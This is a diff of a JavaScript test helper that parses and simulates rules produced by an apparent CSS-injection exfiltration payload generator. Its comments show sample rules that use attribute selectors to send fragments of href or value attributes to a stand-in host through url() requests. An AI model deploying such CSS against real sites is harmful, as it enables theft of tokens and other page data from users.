@@ -1,6 +1,6 @@
 'use strict';
 
-const { generateCSS } = require('../public/payload');
+const { generateCSS, ANCHOR_LENGTH } = require('../public/payload');
 
 // Seeded PRNG so random runs are reproducible. Override with FRAG_SEED=<n>.
 const SEED = process.env.FRAG_SEED ? Number(process.env.FRAG_SEED) : 0xf7a9;
@@ -28,32 +28,22 @@ function rng(seed = SEED) {
   return next;
 }
 
-function grams(s, k = 3) {
+function grams(s, k) {
   const out = new Set();
   for (let i = 0; i + k <= s.length; i++) out.add(s.substring(i, i + k));
   return out;
 }
 
 // Parse the rules generateCSS() emits, e.g.
-//   &[href*="abc"]{--m-a:",abc";--a:url(http://x/log?c=abc&t=m)}
-//   &[value^="abc"]+*{--d-s:"abc";--s:url(http://x/log?c=abc&t=s)}
+//   &[href*="abc"]{--a:url(http://x/abc)}
+//   &[value^="ab"]+*{--s-:url(http://x/s/ab)}
 function parsePayload(css) {
+  const re = /&\[([\w-]+)([\^*$]?=)"([^"]*)"\](?:\+\*)?\{--([\w-]+):url\([^)]*?\/(?:([se])\/)?([0-9a-f]+)\)\}/g;
   const rules = [];
-  const ruleRe = /&\[([\w-]+)([\^*$]?=)"([^"]*)"\](?:\+\*)?\{([^}]*)\}/g;
-  const declRe = /--([\w-]+):url\([^)]*\/log\?c=([0-9a-f]+)&t=([sme])\)/g;
-  for (const [, attr, op, value, body] of css.matchAll(ruleRe)) {
-    for (const [, prop, chunk, type] of body.matchAll(declRe)) {
-      rules.push({ attr, op, value, prop, chunk, type });
-    }
+  for (const [, attr, op, value, prop, type, chunk] of css.matchAll(re)) {
+    rules.push({ index: rules.length, attr, op, value, prop, t: type || 'm', c: chunk });
   }
   return rules;
-}
-
-function matches(op, attrValue, needle) {
-  if (op === '^=') return attrValue.startsWith(needle);
-  if (op === '$=') return attrValue.endsWith(needle);
-  if (op === '*=') return attrValue.includes(needle);
-  return attrValue === needle;
 }
 
 // What the browser would request for an element whose attribute holds
@@ -61,11 +51,26 @@ function matches(op, attrValue, needle) {
 // (all rules share the same specificity), and each property set to a url()
 // becomes one background-image request.
 function leak(rules, attrValue) {
-  const winners = new Map();
-  for (const rule of rules) {
-    if (matches(rule.op, attrValue, rule.value)) winners.set(rule.prop, rule);
+  if (!rules.byNeedle) {
+    rules.byNeedle = new Map();
+    rules.lengths = new Set();
+    for (const r of rules) {
+      const key = r.op + r.value;
+      if (!rules.byNeedle.has(key)) rules.byNeedle.set(key, []);
+      rules.byNeedle.get(key).push(r);
+      rules.lengths.add(r.value.length);
+    }
   }
-  const requests = [...winners.values()].map(r => ({ t: r.type, c: r.chunk }));
+  const matched = [];
+  const add = key => matched.push(...(rules.byNeedle.get(key) || []));
+  for (const n of rules.lengths) {
+    add('^=' + attrValue.slice(0, n));
+    add('$=' + attrValue.slice(-n));
+    for (const s of grams(attrValue, n)) add('*=' + s);
+  }
+  const winners = new Map();
+  for (const r of matched.sort((a, b) => a.index - b.index)) winners.set(r.prop, r);
+  const requests = [...winners.values()].map(r => ({ t: r.t, c: r.c }));
   return {
     requests,
     data: {
@@ -77,10 +82,10 @@ function leak(rules, attrValue) {
 }
 
 function payloadRules(config, server = 'http://frag.test') {
-  const css = generateCSS(config, server);
-  const rules = parsePayload(css);
-  if (rules.length !== 3 * 4096) throw new Error(`expected ${3 * 4096} rules, parsed ${rules.length}`);
+  const rules = parsePayload(generateCSS(config, server));
+  const expected = 16 ** config.windowSize + 2 * 16 ** ANCHOR_LENGTH;
+  if (rules.length !== expected) throw new Error(`expected ${expected} rules, parsed ${rules.length}`);
   return rules;
 }
 
-module.exports = { SEED, rng, grams, parsePayload, leak, payloadRules };
+module.exports = { SEED, ANCHOR_LENGTH, rng, grams, parsePayload, leak, payloadRules };
